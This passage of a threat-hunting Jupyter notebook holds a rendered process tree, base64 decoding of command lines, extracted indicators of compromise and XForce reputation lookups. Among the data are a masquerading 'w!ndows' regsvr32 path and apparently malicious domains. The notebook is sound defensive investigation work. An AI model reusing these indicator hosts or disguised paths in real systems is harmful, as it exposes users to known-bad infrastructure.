23:37:07.990000\",\"c:\\\\w!ndows\\\\system32\\\\regsvr32.exe0x26cc2020-07-07 23:37:08.200000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x14042020-07-07 23:37:08.227000\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe0x192c2020-07-07 22:58:42.097000\",\"c:\\\\program files (x86)\\\\internet explorer\\\\iexplore.exe0x19902020-07-07 22:58:42.203000\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe0xeb02020-07-07 22:58:08.957000\",\"c:\\\\program files (x86)\\\\internet explorer\\\\iexplore.exe0x11cc2020-07-07 22:58:09.473000\",\"c:\\\\program files (x86)\\\\internet explorer\\\\iexplore.exe0x17802020-07-07 22:58:13.897000\"],\"source_index\":[\"660\",\"100\",\"108\",\"11\",\"12\",\"13\",\"110\",\"111\",\"112\",\"113\",\"114\",\"115\",\"116\",\"117\",\"118\",\"120\",\"121\",\"123\",\"122\",\"124\",\"125\",\"126\",\"127\",\"128\",\"130\",\"129\",\"131\",\"132\",\"133\",\"135\",\"134\",\"136\",\"137\",\"138\",\"139\",\"140\",\"141\",\"142\",\"143\",\"144\",\"145\",\"146\",\"148\",\"149\",\"150\",\"151\",\"152\",\"153\",\"154\",\"156\",\"155\",\"157\",\"158\",\"159\",\"160\",\"161\",\"162\",\"163\",\"164\",\"165\",\"166\",\"167\",\"168\",\"169\",\"170\",\"171\",\"172\",\"173\",\"174\",\"175\",\"178\",\"179\",\"180\",\"181\",\"182\",\"183\",\"184\",\"244\",\"245\",\"246\",\"247\",\"248\",\"249\",\"250\",\"252\",\"251\",\"253\",\"254\",\"255\",\"256\",\"257\",\"259\",\"258\",\"260\",\"261\",\"262\",\"264\",\"263\",\"265\",\"266\",\"267\",\"268\",\"269\",\"270\",\"271\",\"272\",\"273\",\"276\",\"277\",\"278\",\"279\",\"280\",\"281\",\"282\",\"283\",\"284\",\"285\",\"286\",\"287\",\"20\",\"21\",\"6\",\"7\",\"9\"],\"source_index_par\":{\"__ndarray__\":\"AAAAAAAA+H8AAAAAAAD4fwAAAAAAAPh/AAAAAAAA+H8AAAAAAEB7QAAAAAAAQHtAAAAAAAAA+H8AAAAAAAD4fwAAAAAAAPh/AAAAAADQc0AAAAAAANBzQAAAAAAA0HNAAAAAAADQc0AAAAAAANBzQAAAAAAA0HNAAAAAAADQc0AAAAAAANBzQAAAAAAAYHRAAAAAAADQc0AAAAAAANBzQAAAAAAAkHRAAAAAAADQc0AAAAAAALB0QAAAAAAA0HNAAAAAAADQdEAAAAAAANBzQAAAAAAA0HNAAAAAAAAAdUAAAAAAANBzQAAAAAAAIHVAAAAAAADQc0AAAAAAANBzQAAAAAAAUHVAAAAAAADQc0AAAAAAAHB1QAAAAAAA0HNAAAAAAACQdUAAAAAAANBzQAAAAAAA0HNAAAAAAADQc0AAAAAAAAD4fwAAAAAA4HVAAAAAAADgdUAAAAAAAOB1QAAAAAAA4HVAAAAAAADgdUAAAAAAAOB1QAAAAAAA4HVAAAAAAADgdUAAAAAAAIB2QAAAAAAA4HVAAAAAAADgdUAAAAAAALB2QAAAAAAA4HVAAAAAAADQdkAAAAAAAOB1QAAAAAAA4HVAAAAAAADwdkAAAAAAAOB1QAAAAAAAIHdAAAAAAADgdUAAAAAAAOB1QAAAAAAAQHdAAAAAAADgdUAAAAAAAHB3QAAAAAAA4HVAAAAAAACQd0AAAAAAAOB1QAAAAAAA4HVAAAAAAADgdUAAAAAAAOB1QAAAAAAAgHhAAAAAAADgdUAAAAAAAKB4QAAAAAAA4HVAAAAAAADAeEAAAAAAAOB1QAAAAAAA4HVAAAAAAADgdUAAAAAAAOB1QAAAAAAA4HVAAAAAAADgdUAAAAAAAOB1QAAAAAAA4HVAAAAAAAAwf0AAAAAAAOB1QAAAAAAA4HVAAAAAAABgf0AAAAAAAOB1QAAAAAAAgH9AAAAAAADgdUAAAAAAAKB/QAAAAAAA4HVAAAAAAADgdUAAAAAAANB/QAAAAAAA4HVAAAAAAADwf0AAAAAAAOB1QAAAAAAA4HVAAAAAAAAQgEAAAAAAAOB1QAAAAAAA8HdAAAAAAADgdUAAAAAAABB4QAAAAAAA4HVAAAAAAADgdUAAAAAAAOB1QAAAAAAA4HVAAAAAAAAQeUAAAAAAAOB1QAAAAAAAMHlAAAAAAADgdUAAAAAAAFB5QAAAAAAA4HVAAAAAAADgdUAAAAAAAOB1QAAAAAAA4HVAAAAAAADgdUAAAAAAAOB1QAAAAAAAAPh/AAAAAAAQfEAAAAAAAAD4fwAAAAAAkHpAAAAAAACQekA=\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[124]}},\"selected\":{\"id\":\"5630\"},\"selection_policy\":{\"id\":\"5629\"}},\"id\":\"5586\",\"type\":\"ColumnDataSource\"},{\"attributes\":{},\"id\":\"5732\",\"type\":\"StringFormatter\"},{\"attributes\":{\"axis_line_color\":null,\"formatter\":{\"id\":\"5627\"},\"major_label_standoff\":0,\"major_tick_line_color\":\"navy\",\"ticker\":{\"id\":\"5654\"},\"visible\":false},\"id\":\"5599\",\"type\":\"LinearAxis\"},{\"attributes\":{},\"id\":\"5733\",\"type\":\"StringEditor\"},{\"attributes\":{\"axis_line_color\":null,\"formatter\":{\"id\":\"5625\"},\"major_label_standoff\":0,\"major_tick_line_color\":\"navy\",\"ticker\":{\"id\":\"5604\"},\"visible\":false},\"id\":\"5603\",\"type\":\"LinearAxis\"},{\"attributes\":{},\"id\":\"5734\",\"type\":\"StringFormatter\"},{\"attributes\":{},\"id\":\"5735\",\"type\":\"StringEditor\"},{\"attributes\":{\"factors\":[\"mstic_admin\"],\"palette\":[\"#440154\",\"#208F8C\",\"#FDE724\"]},\"id\":\"5587\",\"type\":\"CategoricalColorMapper\"},{\"attributes\":{},\"id\":\"5736\",\"type\":\"StringFormatter\"},{\"attributes\":{},\"id\":\"5737\",\"type\":\"StringEditor\"},{\"attributes\":{},\"id\":\"5597\",\"type\":\"LinearScale\"},{\"attributes\":{\"axis\":{\"id\":\"5599\"},\"grid_line_alpha\":0.1,\"grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.1,\"minor_grid_line_color\":\"navy\",\"ticker\":{\"id\":\"5656\"}},\"id\":\"5602\",\"type\":\"Grid\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"TimeGenerated\":\"datetime\"},\"renderers\":[{\"id\":\"5622\"}],\"tooltips\":[[\"Process\",\"@NewProcessName\"],[\"PID\",\"@PID\"],[\"CmdLine\",\"@CommandLine\"],[\"SubjUser\",\"@SubjectUserName\"],[\"SubjLgnId\",\"@SubjectLogonId\"],[\"TargLgnId\",\"@TargetLogonId\"],[\"Time\",\"@TimeGenerated{%F %T}\"]]},\"id\":\"5616\",\"type\":\"HoverTool\"},{\"attributes\":{\"source\":{\"id\":\"5586\"}},\"id\":\"5623\",\"type\":\"CDSView\"},{\"attributes\":{\"end\":7,\"start\":1},\"id\":\"5591\",\"type\":\"Range1d\"},{\"attributes\":{},\"id\":\"5743\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"range\":{\"id\":\"5591\"},\"value\":1.75},\"id\":\"5618\",\"type\":\"Dodge\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.4},\"fill_color\":{\"field\":\"SubjectUserName\",\"transform\":{\"id\":\"5587\"}},\"height\":{\"units\":\"data\",\"value\":0.95},\"line_color\":{\"value\":\"#1f77b4\"},\"width\":{\"units\":\"data\",\"value\":3.5},\"x\":{\"field\":\"Level\",\"transform\":{\"id\":\"5618\"}},\"y\":{\"field\":\"Row\"}},\"id\":\"5620\",\"type\":\"Rect\"},{\"attributes\":{},\"id\":\"5745\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{},\"id\":\"5604\",\"type\":\"BasicTicker\"},{\"attributes\":{\"text\":\"ProcessTree\"},\"id\":\"5589\",\"type\":\"Title\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"5607\"},{\"id\":\"5608\"},{\"id\":\"5609\"},{\"id\":\"5610\"},{\"id\":\"5616\"}]},\"id\":\"5611\",\"type\":\"Toolbar\"},{\"attributes\":{\"label\":{\"field\":\"SubjectUserName\"},\"renderers\":[{\"id\":\"5622\"}]},\"id\":\"5632\",\"type\":\"LegendItem\"},{\"attributes\":{},\"id\":\"5629\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"items\":[{\"id\":\"5632\"}],\"title\":\"SubjectUserName\"},\"id\":\"5631\",\"type\":\"Legend\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"field\":\"SubjectUserName\",\"transform\":{\"id\":\"5587\"}},\"height\":{\"units\":\"data\",\"value\":0.95},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#1f77b4\"},\"width\":{\"units\":\"data\",\"value\":3.5},\"x\":{\"field\":\"Level\",\"transform\":{\"id\":\"5618\"}},\"y\":{\"field\":\"Row\"}},\"id\":\"5621\",\"type\":\"Rect\"},{\"attributes\":{\"below\":[{\"id\":\"5599\"}],\"center\":[{\"id\":\"5602\"},{\"id\":\"5606\"},{\"id\":\"5631\"}],\"left\":[{\"id\":\"5603\"}],\"outline_line_color\":null,\"plot_height\":700,\"plot_width\":900,\"renderers\":[{\"id\":\"5622\"},{\"id\":\"5638\"},{\"id\":\"5645\"},{\"id\":\"5652\"}],\"title\":{\"id\":\"5589\"},\"toolbar\":{\"id\":\"5611\"},\"toolbar_location\":\"above\",\"x_range\":{\"id\":\"5591\"},\"x_scale\":{\"id\":\"5595\"},\"y_range\":{\"id\":\"5593\"},\"y_scale\":{\"id\":\"5597\"}},\"id\":\"5588\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"data_source\":{\"id\":\"5586\"},\"glyph\":{\"id\":\"5620\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5621\"},\"selection_glyph\":null,\"view\":{\"id\":\"5623\"}},\"id\":\"5622\",\"type\":\"GlyphRenderer\"},{\"attributes\":{},\"id\":\"5630\",\"type\":\"Selection\"},{\"attributes\":{\"text\":\"\"},\"id\":\"5718\",\"type\":\"Title\"},{\"attributes\":{},\"id\":\"5719\",\"type\":\"StringEditor\"},{\"attributes\":{},\"id\":\"5625\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{},\"id\":\"5679\",\"type\":\"ResetTool\"},{\"attributes\":{},\"id\":\"5627\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":0.5,\"fill_color\":\"lightgrey\",\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[4,4],\"line_width\":2,\"right_units\":\"screen\",\"top_units\":\"screen\"},\"id\":\"5681\",\"type\":\"BoxAnnotation\"},{\"attributes\":{},\"id\":\"5729\",\"type\":\"StringEditor\"},{\"attributes\":{},\"id\":\"5608\",\"type\":\"ResetTool\"},{\"attributes\":{\"callback\":null},\"id\":\"5610\",\"type\":\"TapTool\"},{\"attributes\":{\"range\":{\"id\":\"5591\"},\"value\":0.1},\"id\":\"5633\",\"type\":\"Dodge\"},{\"attributes\":{\"text\":{\"field\":\"cmd\"},\"text_alpha\":{\"value\":0.1},\"text_baseline\":\"middle\",\"text_color\":{\"value\":\"black\"},\"text_font_size\":{\"value\":\"7pt\"},\"x\":{\"field\":\"Level\",\"transform\":{\"id\":\"5633\"}},\"y\":{\"field\":\"Row\",\"transform\":{\"id\":\"5634\"}}},\"id\":\"5637\",\"type\":\"Text\"},{\"attributes\":{\"editor\":{\"id\":\"5737\"},\"field\":\"TargetLogonId\",\"formatter\":{\"id\":\"5736\"},\"title\":\"TargetLogonId\"},\"id\":\"5712\",\"type\":\"TableColumn\"},{\"attributes\":{\"source\":{\"id\":\"5586\"}},\"id\":\"5714\",\"type\":\"CDSView\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":{\"id\":\"5695\"},\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"5675\"},{\"id\":\"5676\"},{\"id\":\"5677\"},{\"id\":\"5678\"},{\"id\":\"5679\"},{\"id\":\"5680\"},{\"id\":\"5695\"}]},\"id\":\"5682\",\"type\":\"Toolbar\"},{\"attributes\":{\"range\":{\"id\":\"5593\"},\"value\":-0.2},\"id\":\"5634\",\"type\":\"Dodge\"},{\"attributes\":{\"text\":{\"field\":\"cmd\"},\"text_baseline\":\"middle\",\"text_color\":{\"value\":\"black\"},\"text_font_size\":{\"value\":\"7pt\"},\"x\":{\"field\":\"Level\",\"transform\":{\"id\":\"5633\"}},\"y\":{\"field\":\"Row\",\"transform\":{\"id\":\"5634\"}}},\"id\":\"5636\",\"type\":\"Text\"},{\"attributes\":{\"source\":{\"id\":\"5586\"}},\"id\":\"5639\",\"type\":\"CDSView\"},{\"attributes\":{\"text\":{\"field\":\"Exe\"},\"text_alpha\":{\"value\":0.1},\"text_baseline\":\"middle\",\"text_color\":{\"value\":\"black\"},\"text_font_size\":{\"value\":\"8pt\"},\"x\":{\"field\":\"Level\",\"transform\":{\"id\":\"5640\"}},\"y\":{\"field\":\"Row\",\"transform\":{\"id\":\"5641\"}}},\"id\":\"5644\",\"type\":\"Text\"},{\"attributes\":{\"text\":{\"field\":\"Exe\"},\"text_baseline\":\"middle\",\"text_color\":{\"value\":\"black\"},\"text_font_size\":{\"value\":\"8pt\"},\"x\":{\"field\":\"Level\",\"transform\":{\"id\":\"5640\"}},\"y\":{\"field\":\"Row\",\"transform\":{\"id\":\"5641\"}}},\"id\":\"5643\",\"type\":\"Text\"},{\"attributes\":{},\"id\":\"5609\",\"type\":\"SaveTool\"},{\"attributes\":{\"range\":{\"id\":\"5593\"},\"value\":0.25},\"id\":\"5641\",\"type\":\"Dodge\"},{\"attributes\":{\"data_source\":{\"id\":\"5586\"},\"glyph\":{\"id\":\"5636\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5637\"},\"selection_glyph\":null,\"view\":{\"id\":\"5639\"}},\"id\":\"5638\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"data_source\":{\"id\":\"5586\"},\"glyph\":{\"id\":\"5691\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5692\"},\"selection_glyph\":null,\"view\":{\"id\":\"5694\"}},\"id\":\"5693\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"overlay\":{\"id\":\"5696\"},\"x_range\":null,\"y_range\":{\"id\":\"5593\"}},\"id\":\"5695\",\"type\":\"RangeTool\"},{\"attributes\":{\"range\":{\"id\":\"5591\"},\"value\":0.1},\"id\":\"5640\",\"type\":\"Dodge\"},{\"attributes\":{\"editor\":{\"id\":\"5735\"},\"field\":\"ParentProcessName\",\"formatter\":{\"id\":\"5734\"},\"title\":\"ParentProcessName\"},\"id\":\"5711\",\"type\":\"TableColumn\"},{\"attributes\":{\"source\":{\"id\":\"5586\"}},\"id\":\"5694\",\"type\":\"CDSView\"},{\"attributes\":{\"columns\":[{\"id\":\"5702\"},{\"id\":\"5704\"},{\"id\":\"5705\"},{\"id\":\"5706\"},{\"id\":\"5707\"},{\"id\":\"5708\"},{\"id\":\"5709\"},{\"id\":\"5710\"},{\"id\":\"5711\"},{\"id\":\"5712\"}],\"height\":150,\"source\":{\"id\":\"5586\"},\"view\":{\"id\":\"5714\"},\"width\":950},\"id\":\"5713\",\"type\":\"DataTable\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"field\":\"SubjectUserName\",\"transform\":{\"id\":\"5587\"}},\"height\":{\"units\":\"data\",\"value\":0.8},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"#1f77b4\"},\"width\":{\"units\":\"data\",\"value\":1.2},\"x\":{\"field\":\"Level\",\"transform\":{\"id\":\"5689\"}},\"y\":{\"field\":\"Row\"}},\"id\":\"5692\",\"type\":\"Rect\"},{\"attributes\":{\"source\":{\"id\":\"5586\"}},\"id\":\"5646\",\"type\":\"CDSView\"},{\"attributes\":{\"children\":[{\"id\":\"5588\"},{\"id\":\"5658\"}]},\"id\":\"5700\",\"type\":\"Row\"},{\"attributes\":{\"text\":{\"field\":\"PID\"},\"text_alpha\":{\"value\":0.1},\"text_baseline\":\"middle\",\"text_color\":{\"value\":\"black\"},\"text_font_size\":{\"value\":\"8pt\"},\"x\":{\"field\":\"Level\",\"transform\":{\"id\":\"5647\"}},\"y\":{\"field\":\"Row\",\"transform\":{\"id\":\"5648\"}}},\"id\":\"5651\",\"type\":\"Text\"},{\"attributes\":{\"text\":{\"field\":\"PID\"},\"text_baseline\":\"middle\",\"text_color\":{\"value\":\"black\"},\"text_font_size\":{\"value\":\"8pt\"},\"x\":{\"field\":\"Level\",\"transform\":{\"id\":\"5647\"}},\"y\":{\"field\":\"Row\",\"transform\":{\"id\":\"5648\"}}},\"id\":\"5650\",\"type\":\"Text\"},{\"attributes\":{\"range\":{\"id\":\"5593\"},\"value\":0.25},\"id\":\"5648\",\"type\":\"Dodge\"},{\"attributes\":{\"fill_alpha\":0.2,\"fill_color\":\"navy\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[2,2],\"line_width\":0.5},\"id\":\"5696\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"data_source\":{\"id\":\"5586\"},\"glyph\":{\"id\":\"5643\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5644\"},\"selection_glyph\":null,\"view\":{\"id\":\"5646\"}},\"id\":\"5645\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"editor\":{\"id\":\"5723\"},\"field\":\"SubjectUserSid\",\"formatter\":{\"id\":\"5722\"},\"title\":\"SubjectUserSid\"},\"id\":\"5705\",\"type\":\"TableColumn\"},{\"attributes\":{\"range\":{\"id\":\"5591\"},\"value\":1.8},\"id\":\"5647\",\"type\":\"Dodge\"},{\"attributes\":{\"editor\":{\"id\":\"5719\"},\"field\":\"TimeGenerated\",\"formatter\":{\"id\":\"5701\"},\"title\":\"TimeGenerated\"},\"id\":\"5702\",\"type\":\"TableColumn\"},{\"attributes\":{\"end\":125,\"start\":-1},\"id\":\"5661\",\"type\":\"Range1d\"},{\"attributes\":{\"editor\":{\"id\":\"5733\"},\"field\":\"ProcessId\",\"formatter\":{\"id\":\"5732\"},\"title\":\"ProcessId\"},\"id\":\"5710\",\"type\":\"TableColumn\"},{\"attributes\":{\"editor\":{\"id\":\"5721\"},\"field\":\"SubjectUserName\",\"formatter\":{\"id\":\"5720\"},\"title\":\"SubjectUserName\"},\"id\":\"5704\",\"type\":\"TableColumn\"},{\"attributes\":{\"source\":{\"id\":\"5586\"}},\"id\":\"5653\",\"type\":\"CDSView\"},{\"attributes\":{\"below\":[{\"id\":\"5667\"}],\"center\":[{\"id\":\"5670\"},{\"id\":\"5674\"}],\"left\":[{\"id\":\"5671\"}],\"plot_height\":700,\"plot_width\":90,\"renderers\":[{\"id\":\"5693\"}],\"title\":{\"id\":\"5718\"},\"toolbar\":{\"id\":\"5682\"},\"toolbar_location\":null,\"x_range\":{\"id\":\"5659\"},\"x_scale\":{\"id\":\"5663\"},\"y_range\":{\"id\":\"5661\"},\"y_scale\":{\"id\":\"5665\"}},\"id\":\"5658\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{\"format\":\"%F %T\"},\"id\":\"5701\",\"type\":\"DateFormatter\"},{\"attributes\":{\"editor\":{\"id\":\"5725\"},\"field\":\"SubjectLogonId\",\"formatter\":{\"id\":\"5724\"},\"title\":\"SubjectLogonId\"},\"id\":\"5706\",\"type\":\"TableColumn\"},{\"attributes\":{},\"id\":\"5665\",\"type\":\"LinearScale\"},{\"attributes\":{\"data_source\":{\"id\":\"5586\"},\"glyph\":{\"id\":\"5650\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"5651\"},\"selection_glyph\":null,\"view\":{\"id\":\"5653\"}},\"id\":\"5652\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"editor\":{\"id\":\"5727\"},\"field\":\"NewProcessId\",\"formatter\":{\"id\":\"5726\"},\"title\":\"NewProcessId\"},\"id\":\"5707\",\"type\":\"TableColumn\"},{\"attributes\":{\"range\":null,\"value\":-0.5},\"id\":\"5689\",\"type\":\"Dodge\"},{\"attributes\":{\"editor\":{\"id\":\"5729\"},\"field\":\"NewProcessName\",\"formatter\":{\"id\":\"5728\"},\"title\":\"NewProcessName\"},\"id\":\"5708\",\"type\":\"TableColumn\"},{\"attributes\":{\"ticks\":[1,2,3,4]},\"id\":\"5654\",\"type\":\"FixedTicker\"},{\"attributes\":{},\"id\":\"5675\",\"type\":\"PanTool\"},{\"attributes\":{\"editor\":{\"id\":\"5731\"},\"field\":\"CommandLine\",\"formatter\":{\"id\":\"5730\"},\"title\":\"CommandLine\"},\"id\":\"5709\",\"type\":\"TableColumn\"},{\"attributes\":{\"ticks\":[1,2,3,4]},\"id\":\"5656\",\"type\":\"FixedTicker\"},{\"attributes\":{},\"id\":\"5659\",\"type\":\"DataRange1d\"},{\"attributes\":{},\"id\":\"5720\",\"type\":\"StringFormatter\"},{\"attributes\":{},\"id\":\"5728\",\"type\":\"StringFormatter\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.6},\"fill_color\":{\"field\":\"SubjectUserName\",\"transform\":{\"id\":\"5587\"}},\"height\":{\"units\":\"data\",\"value\":0.8},\"line_color\":{\"value\":\"#1f77b4\"},\"width\":{\"units\":\"data\",\"value\":1.2},\"x\":{\"field\":\"Level\",\"transform\":{\"id\":\"5689\"}},\"y\":{\"field\":\"Row\"}},\"id\":\"5691\",\"type\":\"Rect\"},{\"attributes\":{},\"id\":\"5663\",\"type\":\"LinearScale\"},{\"attributes\":{},\"id\":\"5721\",\"type\":\"StringEditor\"},{\"attributes\":{\"formatter\":{\"id\":\"5745\"},\"ticker\":{\"id\":\"5668\"},\"visible\":false},\"id\":\"5667\",\"type\":\"LinearAxis\"},{\"attributes\":{},\"id\":\"5668\",\"type\":\"BasicTicker\"},{\"attributes\":{\"axis\":{\"id\":\"5667\"},\"grid_line_color\":null,\"ticker\":null},\"id\":\"5670\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"5722\",\"type\":\"StringFormatter\"},{\"attributes\":{},\"id\":\"5723\",\"type\":\"StringEditor\"},{\"attributes\":{\"formatter\":{\"id\":\"5743\"},\"ticker\":{\"id\":\"5672\"},\"visible\":false},\"id\":\"5671\",\"type\":\"LinearAxis\"},{\"attributes\":{},\"id\":\"5672\",\"type\":\"BasicTicker\"},{\"attributes\":{\"axis\":{\"id\":\"5671\"},\"dimension\":1,\"grid_line_color\":null,\"ticker\":null},\"id\":\"5674\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"5724\",\"type\":\"StringFormatter\"},{\"attributes\":{},\"id\":\"5725\",\"type\":\"StringEditor\"},{\"attributes\":{},\"id\":\"5680\",\"type\":\"HelpTool\"},{\"attributes\":{},\"id\":\"5726\",\"type\":\"StringFormatter\"},{\"attributes\":{},\"id\":\"5676\",\"type\":\"WheelZoomTool\"},{\"attributes\":{},\"id\":\"5727\",\"type\":\"StringEditor\"},{\"attributes\":{\"overlay\":{\"id\":\"5681\"}},\"id\":\"5677\",\"type\":\"BoxZoomTool\"},{\"attributes\":{},\"id\":\"5678\",\"type\":\"SaveTool\"}],\"root_ids\":[\"5715\"]},\"title\":\"Bokeh Application\",\"version\":\"2.1.1\"}};\n",
       "  var render_items = [{\"docid\":\"4922b6aa-62d9-4f7a-b533-877f31a290cb\",\"root_ids\":[\"5715\"],\"roots\":{\"5715\":\"e5b49ae8-3b83-46ca-b8fb-db603aefd2a6\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        clearInterval(timer);\n",
       "        embed_document(root);\n",
       "      } else {\n",
       "        attempts++;\n",
       "        if (attempts > 100) {\n",
       "          clearInterval(timer);\n",
       "          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        }\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "5715"
      }
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "proc_tree = ptree.get_descendents(p_tree, ptree.get_roots(p_tree)[ptree.get_roots(p_tree)['NewProcessName']==root_proc_sel.value].iloc[0])\n",
    "process_tree = nbdisplay.plot_process_tree(data=proc_tree, legend_col=\"SubjectUserName\", show_table=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### IoC Extract and Lookup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0                                                github-production-release-asset-2e65be.s3.amazonaws.com\n",
       "1    https://github-production-release-asset-2e65be.s3.amazonaws.com/33014811/b8b81d80-b969-11ea-8df7...\n",
       "2    https://github-production-release-asset-2e65be.s3.amazonaws.com/33014811/b8b81d80-b969-11ea-8df7...\n",
       "3                                       2e339b86e13b86d20c35b61308f3ed0a9e7a8eff4cd9adda025f0fba776c8a11\n",
       "4                                                                                          microsoft.com\n",
       "5                                                                                         ftp.wh401k.org\n",
       "6                                                                                          www.401hk.com\n",
       "7                                                                                          www.401hk.com\n",
       "8                                                                                          www.401hk.com\n",
       "9                                                                                          www.401hk.com\n",
       "Name: Observable, dtype: object"
      ]
     },
     "execution_count": 78,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cmd_lines = p_tree.dropna(subset=['CommandLine']).copy()\n",
    "#Base 64 decode\n",
    "dec_df = base64.unpack_df(data=cmd_lines, column=\"CommandLine\")\n",
    "dec_df = dec_df.dropna(subset=['decoded_string'])\n",
    "ioc_ex = IoCExtract()\n",
    "cmd_iocs = ioc_ex.extract(data=cmd_lines, columns=['CommandLine'])\n",
    "b64_iocs = ioc_ex.extract(data=dec_df, columns=['decoded_string'])\n",
    "iocs = pd.concat([cmd_iocs,b64_iocs])\n",
    "iocs['Observable'].head(10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Ioc</th>\n",
       "      <th>IocType</th>\n",
       "      <th>SafeIoc</th>\n",
       "      <th>QuerySubtype</th>\n",
       "      <th>Provider</th>\n",
       "      <th>Result</th>\n",
       "      <th>Severity</th>\n",
       "      <th>Details</th>\n",
       "      <th>RawResult</th>\n",
       "      <th>Reference</th>\n",
       "      <th>Status</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>42</th>\n",
       "      <td>5.1.8.1</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>5.1.8.1</td>\n",
       "      <td>None</td>\n",
       "      <td>XForce</td>\n",
       "      <td>True</td>\n",
       "      <td>warning</td>\n",
       "      <td>{'score': 1, 'cats': {'Dynamic IPs': 86}, 'categoryDescriptions': {'Dynamic IPs': 'This category...</td>\n",
       "      <td>{'ip': '5.1.8.1', 'history': [{'created': '2012-04-26T06:30:00.000Z', 'reason': 'Regional Intern...</td>\n",
       "      <td>https://api.xforce.ibmcloud.com/ipr/5.1.8.1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>44</th>\n",
       "      <td>5.1.8.1</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>5.1.8.1</td>\n",
       "      <td>None</td>\n",
       "      <td>XForce</td>\n",
       "      <td>True</td>\n",
       "      <td>warning</td>\n",
       "      <td>{'score': 1, 'cats': {'Dynamic IPs': 86}, 'categoryDescriptions': {'Dynamic IPs': 'This category...</td>\n",
       "      <td>{'ip': '5.1.8.1', 'history': [{'created': '2012-04-26T06:30:00.000Z', 'reason': 'Regional Intern...</td>\n",
       "      <td>https://api.xforce.ibmcloud.com/ipr/5.1.8.1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>45</th>\n",
       "      <td>2.18.0.2</td>\n",
       "      <td>ipv4</td>\n",
       "      <td>2.18.0.2</td>\n",
       "      <td>None</td>\n",
       "      <td>XForce</td>\n",
       "      <td>True</td>\n",
       "      <td>warning</td>\n",
       "      <td>{'score': 1, 'cats': {}, 'categoryDescriptions': {}, 'reason': 'Regional Internet Registry', 're...</td>\n",
       "      <td>{'ip': '2.18.0.2', 'history': [{'created': '2014-10-22T09:34:00.000Z', 'reason': 'Regional Inter...</td>\n",
       "      <td>https://api.xforce.ibmcloud.com/ipr/2.18.0.2</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
